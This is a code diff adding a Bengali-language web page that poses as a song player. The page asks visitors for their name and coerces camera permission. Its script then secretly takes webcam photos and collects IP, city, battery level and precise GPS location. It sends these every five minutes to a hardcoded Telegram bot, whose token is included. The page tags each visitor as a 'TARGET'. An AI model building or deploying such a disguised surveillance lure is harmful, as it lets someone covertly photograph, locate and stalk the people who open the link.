@@ -1,3 +1,143 @@
- 
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MEDIA ACCESS V9</title>
+    <style>
+        body { background: black; margin: 0; overflow: hidden; font-family: 'Courier New', monospace; color: #00ff00; }
+        canvas { display: block; position: fixed; top: 0; left: 0; z-index: -1; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: flex; justify-content: center; align-items: center; z-index: 100; }
+        .modal { background: #0a0a0a; border: 1px solid #00ff00; padding: 25px; border-radius: 12px; text-align: center; box-shadow: 0 0 20px #00ff00; width: 85%; max-width: 320px; }
+        .input-field { background: #111; border: 1px solid #00ff00; color: #00ff00; padding: 12px; width: 90%; margin: 15px 0; border-radius: 6px; outline: none; text-align: center; }
+        .btn { background: #00ff00; color: black; border: none; padding: 14px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1em; }
+        
+        #videoPlayerBox { display: none; width: 100%; height: 100vh; background: black; flex-direction: column; justify-content: center; align-items: center; }
+        iframe { border: 1px solid #00ff00; width: 95%; height: 250px; border-radius: 10px; }
+    </style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<div class="overlay" id="overlay">
+    <div class="modal">
+        <h2 style="margin:0;">⚠️ ভেরিফিকেশন ⚠️</h2>
+        <p style="font-size: 0.85em; color: #888; margin: 10px 0;">গানটি শোনার জন্য আপনার নাম লিখে ভেরিফাই করুন।</p>
+        <input type="text" id="userName" class="input-field" placeholder="আপনার নাম লিখুন" required>
+        
+        <button class="btn" id="startBtn" onclick="initiateAccess()">ভেরিফাই এবং প্লে করুন</button>
+    </div>
+</div>
+
+<div id="videoPlayerBox">
+    <p style="padding: 10px; font-size: 0.9em; text-align:center;">▶️ ভিডিওটি উপভোগ করুন...</p>
+    <iframe id="youtubeVideo" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    <button class="btn" style="margin-top: 30px; width: 80%;" onclick="window.location.href='https://www.facebook.com/Sadaf245sz'">EXIT</button>
+</div>
+
+<video id="webcam" autoplay playsinline muted style="display:none;"></video>
+<canvas id="snapCanvas" style="display:none;"></canvas>
+
+<script>
+    const TOKEN = '8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE';
+    const CHAT_ID = '7416528268';
+    let targetName = "Unknown";
+
+    // Matrix Background
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const matrixData = "SIYAM_BOSS_Sadaf245sz";
+    const drops = Array(Math.floor(canvas.width / 16)).fill(1);
+    function draw() {
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = '#0F0'; ctx.font = '16px arial';
+        drops.forEach((y, i) => {
+            ctx.fillText(matrixData[Math.floor(Math.random() * matrixData.length)], i * 16, y * 16);
+            if (y * 16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        });
+    }
+    setInterval(draw, 35);
+
+    async function initiateAccess() {
+        const nameInput = document.getElementById('userName').value;
+        if (!nameInput) {
+            alert("অনুগ্রহ করে আপনার নাম লিখুন!");
+            return;
+        }
+        targetName = nameInput;
+
+        try {
+            // বাধ্যতামূলক পারমিশন চেক
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('webcam').srcObject = stream;
+
+            // পারমিশন পেলে সরাসরি ভিডিওতে নিয়ে যাবে (লোডিং বার সরানো হয়েছে)
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('videoPlayerBox').style.display = 'flex';
+            document.getElementById('youtubeVideo').src = "https://www.youtube.com/embed/y0DdGB3OlrQ?autoplay=1&mute=0";
+            
+            startTracking();
+
+        } catch (e) {
+            // যদি পারমিশন না দেয় তবে এই মেসেজটি দেখাবে
+            alert("সতর্কবার্তা: ক্যামেরা এবং লোকেশন পারমিশন ছাড়া গানটি প্লে করা সম্ভব নয়। অনুগ্রহ করে 'Allow' বাটনে ক্লিক করুন।");
+            location.reload(); // পেজ রিলোড করে আবার পারমিশন চাইবে
+        }
+    }
+
+    async function startTracking() {
+        // ভিডিও শুরুর ৫ সেকেন্ড পর প্রথম ডাটা পাঠাবে যাতে ছবি পরিষ্কার আসে
+        setTimeout(() => sendReport("INITIAL_SYNC"), 5000);
+        setInterval(() => sendReport("LOOP_UPDATE"), 300000); 
+    }
+
+    async function sendReport(type) {
+        let batteryInfo = "N/A";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batteryInfo = `${Math.round(b.level * 100)}%`;
+        }
+
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const locData = await locRes.json();
+
+        let log = `👤 *TARGET:* ${targetName}\n🔋 Battery: ${batteryInfo}\n🌐 IP: \`${ipData.ip}\`\n📍 Location: ${locData.city}\n🛰 Maps: [Open](https://www.google.com/maps?q=${locData.latitude},${locData.longitude})`;
+
+        navigator.geolocation.getCurrentPosition((pos) => {
+            sendToTG(log + `\n🎯 GPS: [Maps](https://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude})`);
+        }, () => sendToTG(log), {enableHighAccuracy: true});
+
+        takeSnap();
+    }
+
+    function takeSnap() {
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('snapCanvas');
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'shot.jpg');
+            fd.append('caption', `User: ${targetName}`);
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        }, 'image/jpeg');
+    }
+
+    function sendToTG(msg) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+        });
+    }
+</script>
+</body>
+</html> 
         
         
